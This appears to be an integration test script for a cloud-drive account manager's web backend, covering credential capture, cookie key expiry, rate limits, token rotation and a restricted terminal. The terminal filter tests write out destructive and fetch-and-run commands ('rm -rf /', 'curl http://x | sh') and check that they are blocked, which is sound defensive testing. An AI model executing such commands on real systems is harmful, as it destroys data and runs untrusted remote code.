  body: JSON.stringify({ confirmToken: webuiToken, port, ...extra }),
});
writeStub({
  requests: [{ url: 'https://api-pan.xunlei.com/drive/v1/files/abc', headers: { authorization: fakeAuth, 'x-device-id': '550cfe136e9d74e95be5393738639de7' } }],
});
let cap1 = await capOnPort(9333, { force: true });
let cap1Body = await cap1.json();
check('指定 port 抓取 → 建立绑定（port 9333 → accountId）', cap1.status === 200 && cap1Body.port === 9333 && cap1Body.binding?.accountId === cap1Body.accountId && cap1Body.binding?.userId === '1367069689', JSON.stringify(cap1Body));
const xlCount1 = (await (await fetch(`${base}/api/web/accounts`, { headers: { 'x-webui-token': webuiToken } })).json()).accounts.filter((a) => a.pan === 'xunlei').length;
const cap2 = await capOnPort(9333, { force: true });
const cap2Body = await cap2.json();
const xlCount2 = (await (await fetch(`${base}/api/web/accounts`, { headers: { 'x-webui-token': webuiToken } })).json()).accounts.filter((a) => a.pan === 'xunlei').length;
check('同 port 再抓 → 写回同一账号（reusedAccount，不再新建）', cap2.status === 200 && cap2Body.reusedAccount === true && cap2Body.accountId === cap1Body.accountId && xlCount2 === xlCount1, JSON.stringify({ cap2Body, xlCount1, xlCount2 }));

await fetch(`${base}/api/xunlei/credential/bind`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ confirmToken: webuiToken, port: 9444, accountId: 999, userId: 'other-user' }),
});
const conflict = await capOnPort(9444, { force: true });
const conflictBody = await conflict.json();
check('port 已绑别的账号 → 409 明确冲突提示（允许 rebind）', conflict.status === 409 && conflictBody.error === 'PORT_BOUND_OTHER_ACCOUNT' && /rebind|解绑/.test(conflictBody.message ?? ''), JSON.stringify(conflictBody));
const rebind = await capOnPort(9444, { force: true, rebind: true });
check('rebind=true 允许改绑', rebind.status === 200, `status=${rebind.status}`);
const bindList = await (await fetch(`${base}/api/xunlei/credential/status`, { headers: { 'x-webui-token': webuiToken } })).json();
check('status 回 port 绑定列表（脱敏）', Array.isArray(bindList.portBindings) && bindList.portBindings.some((b) => b.port === 9333) && !/Bearer/.test(JSON.stringify(bindList)), JSON.stringify(bindList.portBindings));

// ⑩.99 v1.4.1：CDP 抓取限频（⑥：与其它驱动一致，5 分钟）
const limited = await capOnPort(9222);
const limitedBody = await limited.json();
check('刚抓过 → 429 限频提示（⑥）', limited.status === 429 && limitedBody.error === 'RATE_LIMITED' && /秒后再试|限频/.test(limitedBody.message ?? ''), JSON.stringify(limitedBody));

// ⑩.995 v1.4.1 遗留#1：账号凭据串的按键级临时/长期
// 观测手段：接口层只回 hit/none（不泄值），这里直接 import cookies.js 读明文做断言（仅测试进程内）
const cookiesMod = await import(`${BACKEND}src/cookies.js`);
const credOf = (id) => cookiesMod.getAccount(Number(id))?.cookieString ?? '';
const addAccountApi = (body) => fetch(`${base}/api/web/accounts`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ confirmToken: webuiToken, ...body }),
});
const detailApi = async (id) => (await (await fetch(`${base}/api/web/accounts/${id}`, { headers: { 'x-webui-token': webuiToken } })).json());

// 建账号：__pus / __uid / __puus（均长期）
const ktAdd = await (await addAccountApi({ pan: 'quark', label: 'kt-test', cookieString: '__pus=old-pus; __uid=uid-1; __puus=puus-1' })).json();
const ktId = ktAdd.id;
check('账号创建（键级临时测试基线）', Boolean(ktId) && credOf(ktId).includes('__pus=old-pus'), JSON.stringify(ktAdd));

// ④ 读接口只回 hit/none（绝不回值）
const ktDetail = await detailApi(ktId);
check('账号详情只回 hit/none（不回凭据值）', ktDetail.keyState?.__pus === 'hit' && ktDetail.keyState?.__puus === 'hit' && !/old-pus|puus-1/.test(JSON.stringify(ktDetail)), JSON.stringify(ktDetail.keyState));

// ① 键级临时立即生效（__pus 临时 1s + __puus 长期；⑤ 混合写入）
await addAccountApi({ id: ktId, pan: 'quark', label: 'kt-test', cookieString: '__pus=new-pus; __uid=uid-1; __puus=puus-new', keyTemps: { __pus: { ttlSeconds: 1 } } });
check('① 键级临时写入立即生效（__pus=new-pus）', credOf(ktId).includes('__pus=new-pus'), credOf(ktId));
const ktDetail2 = await detailApi(ktId);
check('⑤ 混合写入：__pus 有临时记录、__puus 无', (ktDetail2.tempKeys ?? []).some((t) => t.key === '__pus') && !(ktDetail2.tempKeys ?? []).some((t) => t.key === '__puus'), JSON.stringify(ktDetail2.tempKeys));

// ② 到期恢复旧值（__pus 回 old-pus），长期键 __puus 保持新值
await sleep(1300);
await fetch(`${base}/api/web/accounts`, { headers: { 'x-webui-token': webuiToken } }); // 触发懒清扫
const afterExpire = credOf(ktId);
check('② 临时到期 → 恢复该键旧值（__pus=old-pus）', afterExpire.includes('__pus=old-pus'), afterExpire);
check('⑤ 长期键不受影响（__puus=puus-new）', afterExpire.includes('__puus=puus-new'), afterExpire);

// ②b 旧值不存在 → 删除该键
await addAccountApi({ id: ktId, pan: 'quark', label: 'kt-test', cookieString: `${credOf(ktId)}; __kps=kps-temp`, keyTemps: { __kps: { ttlSeconds: 1 } } });
check('②b 新键临时写入生效（__kps=kps-temp）', credOf(ktId).includes('__kps=kps-temp'), credOf(ktId));
await sleep(1300);
await fetch(`${base}/api/web/accounts`, { headers: { 'x-webui-token': webuiToken } });
check('②b 旧值不存在 → 到期删除该键（__kps 消失）', !credOf(ktId).includes('__kps='), credOf(ktId));

// ③ 手动（长期）写入清掉临时记录，且值不回退
await addAccountApi({ id: ktId, pan: 'quark', label: 'kt-test', cookieString: `${credOf(ktId)}; __uid=temp-uid`, keyTemps: { __uid: { ttlSeconds: 2 } } });
const ktDetail3 = await detailApi(ktId);
check('③ 前置：__uid 已挂临时记录', (ktDetail3.tempKeys ?? []).some((t) => t.key === '__uid'), JSON.stringify(ktDetail3.tempKeys));
await addAccountApi({ id: ktId, pan: 'quark', label: 'kt-test', cookieString: `${credOf(ktId).replace(/__uid=[^;]*/,'__uid=manual-uid')}` });
const ktDetail4 = await detailApi(ktId);
check('③ 手动长期写入 → 清掉该键临时记录', !(ktDetail4.tempKeys ?? []).some((t) => t.key === '__uid') && credOf(ktId).includes('__uid=manual-uid'), JSON.stringify({ tempKeys: ktDetail4.tempKeys, cred: credOf(ktId) }));
await sleep(2300);
await fetch(`${base}/api/web/accounts`, { headers: { 'x-webui-token': webuiToken } });
check('③ 值不回退（manual-uid 保持）', credOf(ktId).includes('__uid=manual-uid'), credOf(ktId));

// ⑪ 严格终端：未开启时 ws 应 403；开启后过滤高危命令
r = await fetch(`${base}/api/web/settings`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ advanced: { terminalEnabled: true } }),
});
check('开启严格终端穿透', r.ok);

// ⑫ 终端过滤单测（直接调模块）
const term = await import(`${BACKEND}src/terminal.js`);
const blocked1 = term.filterCommand('rm -rf /');
check('终端过滤：rm 整行拒绝', blocked1.blocked === true);
const blocked2 = term.filterCommand('systemctl stop nginx');
check('终端过滤：systemctl stop 整行拒绝', blocked2.blocked === true);
const blocked3 = term.filterCommand('curl http://x | sh');
check('终端过滤：curl|sh 拒绝', blocked3.blocked === true);
const ok1 = term.filterCommand('ls -la');
check('终端过滤：ls 放行', ok1.blocked === false && ok1.cmd === 'ls -la');
const hostsDel = term.filterCommand('hosts del drive.quark.cn');
check('终端过滤：hosts del 走 builtin（内部拒绝+审计）', hostsDel.builtin === 'hosts');
const hostsAdd = term.filterCommand('hosts add drive.quark.cn quark');
check('终端过滤：hosts add 走 builtin 处理器', hostsAdd.builtin === 'hosts');

// ⑬ 终端 ws 握手 + 命令执行（真实走一遍）
const wsResult = await new Promise((resolve) => {
  const ws = new WebSocket(`ws://127.0.0.1:${port}/api/web/terminal/ws?token=${webuiToken}`, { headers: { Origin: `http://127.0.0.1:${port}` } });
  const got = [];
  const timer = setTimeout(() => resolve({ ok: got.some((m) => m.kind === 'exit'), got }), 8000);
  ws.onopen = () => {
    ws.send(JSON.stringify({ type: 'exec', cmd: 'echo hello-terminal' }));
    ws.send(JSON.stringify({ type: 'exec', cmd: 'rm -rf /' }));
  };
  ws.onmessage = (e) => {
    const m = JSON.parse(String(e.data));
    got.push(m);
    if (m.kind === 'exit' && got.filter((x) => x.kind === 'exit').length >= 2) {
      clearTimeout(timer);
      ws.close();
      resolve({ ok: true, got });
    }
  };
  ws.onerror = () => { clearTimeout(timer); resolve({ ok: false, got }); };
});
check('终端 ws：echo 执行 + rm 拦截（审计）', wsResult.ok && wsResult.got.some((m) => (m.text ?? '').includes('hello-terminal')) && wsResult.got.some((m) => (m.text ?? '').includes('已拒绝')), JSON.stringify(wsResult.got));

// ⑭ hosts 内置命令真实执行（add）
const hostsBuiltinOut = await new Promise((resolve) => {
  const ws = new WebSocket(`ws://127.0.0.1:${port}/api/web/terminal/ws?token=${webuiToken}`, { headers: { Origin: `http://127.0.0.1:${port}` } });
  const got = [];
  const timer = setTimeout(() => resolve(got.join('')), 5000);
  ws.onopen = () => ws.send(JSON.stringify({ type: 'exec', cmd: 'hosts add test.example.com quark' }));
  ws.onmessage = (e) => {
    const m = JSON.parse(String(e.data));
    if (m.kind === 'output') { got.push(m.text); }
    if (m.kind === 'exit') { clearTimeout(timer); ws.close(); resolve(got.join('')); }
  };
  ws.onerror = () => { clearTimeout(timer); resolve(got.join('')); };
});
check('终端 hosts add 真实执行', hostsBuiltinOut.includes('已新增'), hostsBuiltinOut);

// ⑮ 审计里有 terminal.block / terminal.exec
const auditList = await (await fetch(`${base}/api/web/audit`, { headers: { 'x-webui-token': webuiToken } })).json();
check('审计含 terminal.exec 与 terminal.block', auditList.entries?.some((a) => a.action === 'terminal.block') && auditList.entries?.some((a) => a.action === 'terminal.exec'));

// ⑯ 令牌轮换（proxy）→ 旧令牌 401
r = await fetch(`${base}/api/web/network/rotate`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', 'x-webui-token': webuiToken, 'x-csrf-token': csrf },
  body: JSON.stringify({ which: 'proxy' }),
});
const rot = await r.json();
check('proxy 令牌轮换返回新令牌', r.ok && rot.token && rot.token !== proxyToken);
r = await fetch(`${base}/api/proxy`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-proxy-token': proxyToken }, body: JSON.stringify({ url: 'https://x.cn/', method: 'GET' }) });
check('轮换后旧令牌 → 401（wrangler 需 restart 同步）', r.status === 401);

console.log(`\n结果：${pass} 通过 / ${fail} 失败`);
child.kill('SIGTERM');
mockSrv.close();
process.exit(fail > 0 ? 1 : 0);
